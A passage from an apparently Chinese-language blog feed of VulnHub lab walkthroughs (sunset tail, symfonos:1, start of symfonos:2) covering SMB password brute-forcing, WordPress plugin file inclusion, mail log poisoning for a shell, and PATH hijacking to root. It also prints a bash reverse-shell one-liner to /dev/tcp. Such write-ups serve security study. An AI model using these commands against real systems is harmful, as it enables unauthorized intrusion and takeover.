<p> 他用的是<code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.2.3/8848 0&gt;&amp;1&quot;</code>据师傅所说，是因为只是在数据库中实现了<code>sys_eval</code>函数，并不是一个真正的shell（解释器不对），所以不能直接反弹shell，套上一层<code>bash -c </code>之后，就变成了使用<code>bash</code>解释后面的反弹命令，所以可以成功。（las师傅tql）</p>
</li>
<li><p> 还测试了<code>~/.ssh/authroized_keys</code>，权限必须是<code>600</code>才可，然而通过sql写入的文件的权限为<code>660</code>导致了失败（还是有点不清楚为什么）。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>exploit</category>
        <category>sunset</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>file-including</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub symfonos:1靶机</title>
    <url>//symfonos-1.html</url>
    <content><![CDATA[<p>vulnhub里的 symfonos-1 靶机</p>
<p>简单难度</p>
<a id="more"></a>



<h1 id="Symfonos-1"><a href="#Symfonos-1" class="headerlink" title="Symfonos:1"></a>Symfonos:1</h1><p>靶机的ip地址为<code>192.168.2.177</code></p>
<p>开放端口<code>22 80 139 445</code></p>
<h2 id="445"><a href="#445" class="headerlink" title="445"></a>445</h2><p>熟悉的445端口运行了熟悉的服务（smb）</p>
<img src="symfonos:1/image-20200727212653785.png" alt="image-20200727212653785" style="zoom:50%;" />

<p>先使用<code>enum4linux</code>得到靶机的用户</p>
<p><code>enum4linux -U 192.168.2.177</code>，得到了用户名<code>helios</code></p>
<img src="symfonos:1/image-20200727213047872.png" alt="image-20200727213047872" style="zoom:50%;" />

<p>直接上<code>msfconsole</code>的<code>smb_login</code>模块去爆破密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/scanner/smb/smb_login</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; set rhost 192.168.2.177</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; set smbuser helios</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/smb/smb_login) &gt; set pass_file /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="symfonos:1/image-20200727213359202.png" alt="image-20200727213359202" style="zoom:50%;" />

<p>得到了密码为<code>qwerty</code></p>
<p>然后使用<code>smbclient</code>登录</p>
<img src="symfonos:1/image-20200727213638693.png" alt="image-20200727213638693" style="zoom:50%;" />

<p>都遍历一遍找到三个文件</p>
<img src="symfonos:1/image-20200727213738279.png" alt="image-20200727213738279" style="zoom:50%;" />

<p>原来在<code>anonymous</code>下有<code>attention.txt</code>告诉了密码（不管了，反正爆破出来了）</p>
<p>然后在<code>todo.txt</code>下发现了一个<code>/h3l105</code>，估计是一个目录</p>
<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>访问一下</p>
<img src="symfonos:1/image-20200727214045765.png" alt="image-20200727214045765" style="zoom:50%;" />

<p>扫描目录之后有一个奇怪的目录，但是并没有用，想到上面的目录，试一下，但是发现连接不上，作者在靶机的提示中给了可能需要修改<code>hosts</code>，并且左下角会有提示<code>正在解析symfonos.local</code>。</p>
<p>所以在<code>/etc/hosts</code>文件里面加入解析就行</p>
<img src="symfonos:1/image-20200727214314836.png" alt="image-20200727214314836" style="zoom:50%;" />

<p>然后访问得到是一个wordpress的网站</p>
<img src="symfonos:1/image-20200727214401475.png" alt="image-20200727214401475" style="zoom:50%;" />

<p>那就使用<code>wpscan</code>扫描一下，得到有两个插件</p>
<img src="symfonos:1/image-20200727214653033.png" alt="image-20200727214653033" style="zoom:50%;" />

<p>找一下存不存在漏洞</p>
<p><code>searchsploit mail masta</code>（另一个也有，这里不举例了）</p>
<img src="symfonos:1/image-20200727214742013.png" alt="image-20200727214742013" style="zoom:50%;" />

<p>发现了有漏洞，而且版本符合，那么看一下exp怎么说的</p>
<img src="symfonos:1/image-20200727214918852.png" alt="image-20200727214918852" style="zoom:50%;" />

<p>去试试看</p>
<img src="symfonos:1/image-20200727214955809.png" alt="image-20200727214955809" style="zoom:50%;" />

<p>发现了确实存在这个EFI漏洞</p>
<p>本来想使用log文件包含反弹一个shell的，发现不知道log文件在哪里</p>
<p>（翻了翻参考答案）得知可以使用<code>/var/mail/helios</code>（因为开启了smtp服务，可以发送邮件）</p>
<p>使用telnet发送邮件</p>
<p><code>telnet 192.168.2.177 25</code></p>
<img src="symfonos:1/image-20200727215346802.png" alt="image-20200727215346802" style="zoom:50%;" />

<p>然后使用EFI，本地监听，得到一个shell</p>
<img src="symfonos:1/image-20200727215536502.png" alt="image-20200727215536502" style="zoom:50%;" />

<p>然后找提权的东西，</p>
<img src="symfonos:1/image-20200727215647621.png" alt="image-20200727215647621" style="zoom:50%;" />

<p>他的画风和别人不一样（雾）</p>
<p>把它下载下来反编译一下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 command; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line"></span><br><span class="line">  command = &#x27; I- lruc&#x27;;</span><br><span class="line">  v5 = &#x27;l//:ptth&#x27;;</span><br><span class="line">  v6 = &#x27;tsohlaco&#x27;;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  system((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;command);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>倒过来看（小端序）命令是<code>curl -I http://localhost</code></p>
<p>那就劫持<code>curl</code></p>
<img src="symfonos:1/image-20200727215918476.png" alt="image-20200727215918476" style="zoom:50%;" />

<p>在<code>/tmp</code>目录下创建一个<code>curl</code>文件</p>
<img src="symfonos:1/image-20200727220006160.png" alt="image-20200727220006160" style="zoom:50%;" />

<p>然后运行<code>/opt/statuscheck</code></p>
<img src="symfonos:1/image-20200727220035574.png" alt="image-20200727220035574" style="zoom:50%;" />

<p>得到了root权限</p>
]]></content>
      <categories>
        <category>exploit</category>
        <category>symfonos</category>
      </categories>
      <tags>
        <tag>exploit</tag>
        <tag>wordpress</tag>
        <tag>smb</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub symfonos:2靶机</title>
    <url>//symfonos-2.html</url>
    <content><![CDATA[<p>vulnhub里的 symfonos-2 靶机</p>
<p>靶机ip:<code>192.168.2.179</code></p>
<p>kali:<code>192.168.2.178</code></p>
<a id="more"></a>

<h2 id="主机发现-amp-amp-端口扫描"><a href="#主机发现-amp-amp-端口扫描" class="headerlink" title="主机发现&amp;&amp;端口扫描"></a>主机发现&amp;&amp;端口扫描</h2><p>靶机</p>
<img src="symfonos:2/image-20200808144335709.png" alt="image-20200808144335709" style="zoom:50%;" />

<p>端口扫描</p>
<img src="symfonos:2/image-20200808144519233.png" alt="image-20200808144519233" style="zoom:50%;" />



<h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><p>使用<code>smbclient</code>查看一下共享文件夹</p>
<img src="symfonos:2/image-20200808144625632.png" alt="image-20200808144625632" style="zoom:50%;" />

<p>应该是支持匿名登陆的</p>
<p>使用<code>anonymous</code>登录，查看文件</p>
<img src="symfonos:2/image-20200808144853131.png" alt="image-20200808144853131" style="zoom:50%;" />



<h3 id="log-txt"><a href="#log-txt" class="headerlink" title="log.txt"></a>log.txt</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@symfonos2:~# cat /etc/shadow &gt; /var/backups/shadow.bak</span><br><span class="line">root@symfonos2:~# cat /etc/samba/smb.conf</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment"># Sample configuration file for the Samba suite for Debian GNU/Linux.</span></span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment">#</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This is the main Samba configuration file. You should <span class="built_in">read</span> the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> smb.conf(5) manual page <span class="keyword">in</span> order to understand the options listed</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> here. Samba has a huge number of configurable options most of <span class="built_in">which</span></span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> are not shown <span class="keyword">in</span> this example</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment"># Some options that are often worth tuning have been included as</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> commented-out examples <span class="keyword">in</span> this file.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">  - When such options are commented with <span class="string">&quot;;&quot;</span>, the proposed setting</span></span><br><span class="line"><span class="meta">#</span><span class="bash">    differs from the default Samba behaviour</span></span><br><span class="line"><span class="meta">#</span><span class="bash">  - When commented with <span class="string">&quot;#&quot;</span>, the proposed setting is the default</span></span><br><span class="line"><span class="meta">#</span><span class="bash">    behaviour of Samba but the option is considered important</span></span><br><span class="line"><span class="meta">#</span><span class="bash">    enough to be mentioned here</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment"># <span class="doctag">NOTE:</span> Whenever you modify this file you should run the command</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&quot;testparm&quot;</span> to check that you have not made any basic syntactic</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> errors.</span> </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">======================= Global Settings =======================</span></span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># Browsing/Identification ###</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Change this to the workgroup/NT-domain name your Samba server will part of</span></span><br><span class="line">   workgroup = WORKGROUP</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows Internet Name Serving Support Section:</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> WINS Support - Tells the NMBD component of Samba to <span class="built_in">enable</span> its WINS Server</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   wins support = no</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> WINS Server - Tells the NMBD components of Samba to be a WINS Client</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note: Samba can be either a WINS Server, or a WINS Client, but NOT both</span></span><br><span class="line">;   wins server = w.x.y.z</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This will prevent nmbd to search <span class="keyword">for</span> NetBIOS names through DNS.</span></span><br><span class="line">   dns proxy = no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### Networking ####</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The specific <span class="built_in">set</span> of interfaces / networks to <span class="built_in">bind</span> to</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This can be either the interface name or an IP address/netmask;</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> interface names are normally preferred</span></span><br><span class="line">;   interfaces = 127.0.0.0/8 eth0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Only <span class="built_in">bind</span> to the named interfaces and/or networks; you must use the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&#x27;interfaces&#x27;</span> option above to use this.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> It is recommended that you <span class="built_in">enable</span> this feature <span class="keyword">if</span> your Samba machine is</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> not protected by a firewall or is a firewall itself.  However, this</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> option cannot handle dynamic or non-broadcast interfaces correctly.</span></span><br><span class="line">;   bind interfaces only = yes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### Debugging/Accounting ####</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This tells Samba to use a separate <span class="built_in">log</span> file <span class="keyword">for</span> each machine</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> that connects</span></span><br><span class="line">   log file = /var/log/samba/log.%m</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Cap the size of the individual <span class="built_in">log</span> files (<span class="keyword">in</span> KiB).</span></span><br><span class="line">   max log size = 1000</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you want Samba to only <span class="built_in">log</span> through syslog <span class="keyword">then</span> <span class="built_in">set</span> the following</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> parameter to <span class="string">&#x27;yes&#x27;</span>.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   syslog only = no</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> We want Samba to <span class="built_in">log</span> a minimum amount of information to syslog. Everything</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> should go to /var/<span class="built_in">log</span>/samba/<span class="built_in">log</span>.&#123;smbd,nmbd&#125; instead. If you want to <span class="built_in">log</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> through syslog you should <span class="built_in">set</span> the following parameter to something higher.</span></span><br><span class="line">   syslog = 0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Do something sensible when Samba crashes: mail the admin a backtrace</span></span><br><span class="line">   panic action = /usr/share/samba/panic-action %d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">###### Authentication #######</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Server role. Defines <span class="keyword">in</span> <span class="built_in">which</span> mode Samba will operate. Possible</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> values are <span class="string">&quot;standalone server&quot;</span>, <span class="string">&quot;member server&quot;</span>, <span class="string">&quot;classic primary</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> domain controller<span class="string">&quot;, &quot;</span>classic backup domain controller<span class="string">&quot;, &quot;</span>active</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> directory domain controller<span class="string">&quot;.</span></span> </span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment"># Most people will want &quot;standalone sever&quot; or &quot;member server&quot;.</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Running as <span class="string">&quot;active directory domain controller&quot;</span> will require first</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> running <span class="string">&quot;samba-tool domain provision&quot;</span> to wipe databases and create a</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> new domain.</span></span><br><span class="line">   server role = standalone server</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> If you are using encrypted passwords, Samba will need to know what</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> password database <span class="built_in">type</span> you are using.</span>  </span><br><span class="line">   passdb backend = tdbsam</span><br><span class="line"></span><br><span class="line">   obey pam restrictions = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This boolean parameter controls whether Samba attempts to sync the Unix</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> password with the SMB password when the encrypted SMB password <span class="keyword">in</span> the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> passdb is changed.</span></span><br><span class="line">   unix password sync = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> For Unix password sync to work on a Debian GNU/Linux system, the following</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> parameters must be <span class="built_in">set</span> (thanks to Ian Kahan &lt;&lt;<span class="string">kahan@informatik.tu-muenchen.de&gt; for</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> sending the correct chat script <span class="keyword">for</span> the passwd program <span class="keyword">in</span> Debian Sarge).</span></span><br><span class="line">   passwd program = /usr/bin/passwd %u</span><br><span class="line">   passwd chat = *Enter\snew\s*\spassword:* %n\n *Retype\snew\s*\spassword:* %n\n *password\supdated\ssuccessfully* .</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This boolean controls whether PAM will be used <span class="keyword">for</span> password changes</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> when requested by an SMB client instead of the program listed <span class="keyword">in</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&#x27;passwd program&#x27;</span>. The default is <span class="string">&#x27;no&#x27;</span>.</span></span><br><span class="line">   pam password change = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This option controls how unsuccessful authentication attempts are mapped</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to anonymous connections</span></span><br><span class="line">   map to guest = bad user</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">######### Domains ###########</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="bash"><span class="comment"># The following settings only takes effect if &#x27;server role = primary</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> classic domain controller<span class="string">&#x27;, &#x27;</span>server role = backup domain controller<span class="string">&#x27;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> or <span class="string">&#x27;domain logons&#x27;</span> is <span class="built_in">set</span></span> </span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="bash"><span class="comment"># It specifies the location of the user&#x27;s</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> profile directory from the client point of view) The following</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> required a [profiles] share to be setup on the samba server (see</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> below)</span></span><br><span class="line">;   logon path = \\%N\profiles\%U</span><br><span class="line"><span class="meta">#</span><span class="bash"> Another common choice is storing the profile <span class="keyword">in</span> the user<span class="string">&#x27;s home directory</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> (this is Samba<span class="string">&#x27;s default)</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">   logon path = \\%N\%U\profile</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The following setting only takes effect <span class="keyword">if</span> <span class="string">&#x27;domain logons&#x27;</span> is <span class="built_in">set</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> It specifies the location of a user<span class="string">&#x27;s home directory (from the client</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> point of view)</span></span><br><span class="line">;   logon drive = H:</span><br><span class="line"><span class="meta">#</span><span class="bash">   logon home = \\%N\%U</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> The following setting only takes effect <span class="keyword">if</span> <span class="string">&#x27;domain logons&#x27;</span> is <span class="built_in">set</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> It specifies the script to run during logon. The script must be stored</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">in</span> the [netlogon] share</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> NOTE: Must be store <span class="keyword">in</span> <span class="string">&#x27;DOS&#x27;</span> file format convention</span></span><br><span class="line">;   logon script = logon.cmd</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This allows Unix users to be created on the domain controller via the SAMR</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RPC pipe.  The example <span class="built_in">command</span> creates a user account with a disabled Unix</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> password; please adapt to your needs</span></span><br><span class="line">; add user script = /usr/sbin/adduser --quiet --disabled-password --gecos &quot;&quot; %u</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This allows machine accounts to be created on the domain controller via the</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> SAMR RPC pipe.</span>  </span><br><span class="line"><span class="meta">#</span><span class="bash"> The following assumes a <span class="string">&quot;machines&quot;</span> group exists on the system</span></span><br><span class="line">; add machine script  = /usr/sbin/useradd -g machines -c &quot;%u machine account&quot; -d /var/lib/samba -s /bin/false %u</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> This allows Unix groups to be created on the domain controller via the SAMR</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> RPC pipe.</span>  </span><br><span class="line">; add group script = /usr/sbin/addgroup --force-badname %g</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">########### Misc ############</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Using the following line enables you to customise your configuration</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> on a per machine basis. The %m gets replaced with the netbios name</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> of the machine that is connecting</span></span><br><span class="line">;   include = /home/samba/etc/smb.conf.%m</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Some defaults <span class="keyword">for</span> winbind (make sure you<span class="string">&#x27;re not using the ranges</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">for</span> something <span class="keyword">else</span>.)</span></span><br><span class="line">;   idmap uid = 10000-20000</span><br><span class="line">;   idmap gid = 10000-20000</span><br><span class="line">;   template shell = /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Setup usershare options to <span class="built_in">enable</span> non-root users to share folders</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> with the net usershare <span class="built_in">command</span>.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Maximum number of usershare. 0 (default) means that usershare is disabled.</span></span><br><span class="line">;   usershare max shares = 100</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Allow users who<span class="string">&#x27;ve been granted usershare privileges to create</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> public shares, not just authenticated ones</span></span><br><span class="line">   usershare allow guests = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">======================= Share Definitions =======================</span></span><br><span class="line"></span><br><span class="line">[homes]</span><br><span class="line">   comment = Home Directories</span><br><span class="line">   browseable = no</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> By default, the home directories are exported read-only. Change the</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> next parameter to <span class="string">&#x27;no&#x27;</span> <span class="keyword">if</span> you want to be able to write to them.</span></span><br><span class="line">   read only = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> File creation mask is <span class="built_in">set</span> to 0700 <span class="keyword">for</span> security reasons. If you want to</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> create files with group=rw permissions, <span class="built_in">set</span> next parameter to 0775.</span></span><br><span class="line">   create mask = 0700</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Directory creation mask is <span class="built_in">set</span> to 0700 <span class="keyword">for</span> security reasons. If you want to</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> create <span class="built_in">dirs</span>. with group=rw permissions, <span class="built_in">set</span> next parameter to 0775.</span></span><br><span class="line">   directory mask = 0700</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> By default, \\server\username shares can be connected to by anyone</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> with access to the samba server.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The following parameter makes sure that only <span class="string">&quot;username&quot;</span> can connect</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to \\server\username</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> This might need tweaking when using external authentication schemes</span></span><br><span class="line">   valid users = %S</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Un-comment the following and create the netlogon directory <span class="keyword">for</span> Domain Logons</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> (you need to configure Samba to act as a domain controller too.)</span></span><br><span class="line">;[netlogon]</span><br><span class="line">;   comment = Network Logon Service</span><br><span class="line">;   path = /home/samba/netlogon</span><br><span class="line">;   guest ok = yes</span><br><span class="line">;   read only = yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Un-comment the following and create the profiles directory to store</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> users profiles (see the <span class="string">&quot;logon path&quot;</span> option above)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> (you need to configure Samba to act as a domain controller too.)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> The path below should be writable by all users so that their</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> profile directory may be created the first time they <span class="built_in">log</span> on</span></span><br><span class="line">;[profiles]</span><br><span class="line">;   comment = Users profiles</span><br><span class="line">;   path = /home/samba/profiles</span><br><span class="line">;   guest ok = no</span><br><span class="line">;   browseable = no</span><br><span class="line">;   create mask = 0600</span><br><span class="line">;   directory mask = 0700</span><br><span class="line"></span><br><span class="line">[printers]</span><br><span class="line">   comment = All Printers</span><br><span class="line">   browseable = no</span><br><span class="line">   path = /var/spool/samba</span><br><span class="line">   printable = yes</span><br><span class="line">   guest ok = no</span><br><span class="line">   read only = yes</span><br><span class="line">   create mask = 0700</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Windows clients look <span class="keyword">for</span> this share name as a <span class="built_in">source</span> of downloadable</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> printer drivers</span></span><br><span class="line"><span class="meta">[print$</span><span class="bash">]</span></span><br><span class="line">   comment = Printer Drivers</span><br><span class="line">   path = /var/lib/samba/printers</span><br><span class="line">   browseable = yes</span><br><span class="line">   read only = yes</span><br><span class="line">   guest ok = no</span><br><span class="line"><span class="meta">#</span><span class="bash"> Uncomment to allow remote administration of Windows <span class="built_in">print</span> drivers.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> You may need to replace <span class="string">&#x27;lpadmin&#x27;</span> with the name of the group your</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> admin users are members of.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Please note that you also need to <span class="built_in">set</span> appropriate Unix permissions</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to the drivers directory <span class="keyword">for</span> these users to have write rights <span class="keyword">in</span> it</span></span><br><span class="line">;   write list = root, @lpadmin</span><br><span class="line"></span><br><span class="line">[anonymous]</span><br><span class="line">   path = /home/aeolus/share</span><br><span class="line">   browseable = yes</span><br><span class="line">   read only = yes</span><br><span class="line">   guest ok = yes</span><br><span class="line"></span><br><span class="line">root@symfonos2:~# cat /usr/local/etc/proftpd.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> This is a basic ProFTPD configuration file (rename it to</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&#x27;proftpd.conf&#x27;</span> <span class="keyword">for</span> actual use.  It establishes a single server</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> and a single anonymous login.  It assumes that you have a user/group</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="string">&quot;nobody&quot;</span> and <span class="string">&quot;ftp&quot;</span> <span class="keyword">for</span> normal operation and anon.</span></span><br><span class="line"></span><br><span class="line">ServerName			&quot;ProFTPD Default Installation&quot;</span><br><span class="line">ServerType			standalone</span><br><span class="line">DefaultServer			on</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Port 21 is the standard FTP port.</span></span><br><span class="line">Port				21</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Don<span class="string">&#x27;t use IPv6 support by default.</span></span></span><br><span class="line">UseIPv6				off</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Umask 022 is a good standard <span class="built_in">umask</span> to prevent new <span class="built_in">dirs</span> and files</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> from being group and world writable.</span></span><br><span class="line">Umask				022</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> To prevent DoS attacks, <span class="built_in">set</span> the maximum number of child processes</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to 30.  If you need to allow more than 30 concurrent connections</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> at once, simply increase this value.  Note that this ONLY works</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="keyword">in</span> standalone mode, <span class="keyword">in</span> inetd mode you should use an inetd server</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> that allows you to <span class="built_in">limit</span> maximum number of processes per service</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> (such as xinetd).</span></span><br><span class="line">MaxInstances			30</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Set the user and group under <span class="built_in">which</span> the server will run.</span></span><br><span class="line">User				aeolus</span><br><span class="line">Group				aeolus</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> To cause every FTP user to be <span class="string">&quot;jailed&quot;</span> (chrooted) into their home</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> directory, uncomment this line.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">DefaultRoot ~</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Normally, we want files to be overwriteable.</span></span><br><span class="line">AllowOverwrite		on</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Bar use of SITE CHMOD by 